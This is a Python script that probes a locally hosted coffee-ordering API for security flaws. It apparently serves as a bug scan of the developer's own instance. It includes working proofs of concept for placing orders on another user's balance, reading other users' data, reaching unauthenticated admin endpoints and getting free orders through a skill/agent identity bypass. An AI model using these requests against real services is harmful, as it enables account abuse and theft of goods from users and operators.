from __future__ import annotations

import json
import secrets
import sqlite3
import uuid

import httpx


BASE = "http://127.0.0.1:8022"


def register(client: httpx.Client, prefix: str) -> dict:
    suffix = secrets.token_hex(4)
    response = client.post(
        f"{BASE}/auth/register",
        json={
            "username": f"{prefix}_{suffix}",
            "password": secrets.token_urlsafe(18),
            "nickname": prefix,
        },
    )
    response.raise_for_status()
    return response.json()


def main() -> None:
    a = httpx.Client(timeout=20)
    b = httpx.Client(timeout=20)
    anonymous = httpx.Client(timeout=20)

    account_a = register(a, "bugscan_a")
    account_b = register(b, "bugscan_b")
    user_a = int(account_a["user_id"])
    user_b = int(account_b["user_id"])

    balance_before = float(a.get(f"{BASE}/user/{user_b}").json()["balance"])
    cross_user_read = {
        "user": a.get(f"{BASE}/user/{user_b}").status_code,
        "orders": a.get(f"{BASE}/orders/{user_b}").status_code,
        "history": a.get(f"{BASE}/history/{user_b}").status_code,
    }

    pending = a.post(
        f"{BASE}/chat", json={"user_id": user_b, "message": "美式咖啡"}
    )
    confirmed = a.post(
        f"{BASE}/chat", json={"user_id": user_b, "message": "确认"}
    )
    balance_after = float(a.get(f"{BASE}/user/{user_b}").json()["balance"])

    anon_user_id = 999_999
    anon_pending = anonymous.post(
        f"{BASE}/chat", json={"user_id": anon_user_id, "message": "美式咖啡"}
    )
    anon_confirm = anonymous.post(
        f"{BASE}/chat", json={"user_id": anon_user_id, "message": "确认"}
    )
    anon_reply = anon_confirm.json().get("reply", "") if anon_confirm.is_success else ""

    public_admin = {
        "restaurant_state": anonymous.get(f"{BASE}/admin/restaurant-state").status_code,
        "visitor_analytics": anonymous.get(f"{BASE}/admin/visitor-analytics").status_code,
        "visitor_chat": anonymous.get(f"{BASE}/admin/visitor-chat?limit=1").status_code,
    }

    layout_namespace = "bugscan-" + uuid.uuid4().hex[:8]
    layout_write = anonymous.put(
        f"{BASE}/api/office/layout",
        json={"namespace": layout_namespace, "items": [{"_uid": "probe", "type": "chair"}]},
    )
    layout_read = anonymous.get(
        f"{BASE}/api/office/layout", params={"namespace": layout_namespace}
    )

    skill_registration = anonymous.post(
        f"{BASE}/skill/register",
        json={
            "tool_name": "legitimate-skill",
            "display_name": "Legitimate Skill",
            "evomap_node_id": "bugscan-node-" + uuid.uuid4().hex,
        },
    )
    skill_registration.raise_for_status()
    consumer_id = int(skill_registration.json()["consumer_id"])

    generic_agent = anonymous.post(
        f"{BASE}/agents/register",
        json={
            "tool_name": "generic-agent",
            "display_name": "Generic Agent",
            "role_type": "customer",
            "metadata": {},
        },
    )
    generic_agent.raise_for_status()
    generic_data = generic_agent.json()
    stolen_free_order = anonymous.post(
        f"{BASE}/skill/orders",
        headers={"Authorization": f"Bearer {generic_data['api_token']}"},
        json={
            "consumer_id": consumer_id,
            "agent_id": int(generic_data["agent_id"]),
            "message": "美式咖啡",
            "request_id": "bugscan-bypass-" + uuid.uuid4().hex,
            "auto_confirm": True,
        },
    )
    stolen_body = stolen_free_order.json() if stolen_free_order.is_success else {}

    out_of_stock_pending = b.post(
        f"{BASE}/chat", json={"user_id": user_a, "message": "美式咖啡"}
    )
    with sqlite3.connect(".tmp_bugscan.db") as db:
        db.execute("UPDATE product SET stock = 0, status = 'sold_out' WHERE name = ?", ("美式咖啡",))
        db.commit()
    out_of_stock_confirm = b.post(
        f"{BASE}/chat", json={"user_id": user_a, "message": "确认"}
    )

    summary = {
        "idor": {
            "account_a_user_id": user_a,
            "account_b_user_id": user_b,
            "cross_user_read_status": cross_user_read,
            "pending_status": pending.status_code,
            "confirm_status": confirmed.status_code,
            "victim_balance_before": balance_before,
            "victim_balance_after": balance_after,
            "victim_balance_changed_by_other_session": balance_after < balance_before,
        },
        "anonymous_order": {
            "pending_status": anon_pending.status_code,
            "confirm_status": anon_confirm.status_code,
            "failed_user_missing": "用户不存在" in anon_reply,
        },
        "public_admin_status": public_admin,
        "anonymous_layout": {
            "write_status": layout_write.status_code,
            "read_status": layout_read.status_code,
            "roundtrip_ok": layout_read.is_success
            and layout_read.json().get("items", [{}])[0].get("_uid") == "probe",
        },
        "skill_identity_bypass": {
            "status": stolen_free_order.status_code,
            "completed": stolen_body.get("status") == "completed",
            "payment_status": stolen_body.get("payment_status"),
            "consumer_id": consumer_id,
            "generic_agent_id": int(generic_data["agent_id"]),
        },
        "out_of_stock_confirm": {
            "pending_status": out_of_stock_pending.status_code,
            "confirm_status": out_of_stock_confirm.status_code,
            "server_error": out_of_stock_confirm.status_code >= 500,
        },
    }
    print(json.dumps(summary, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
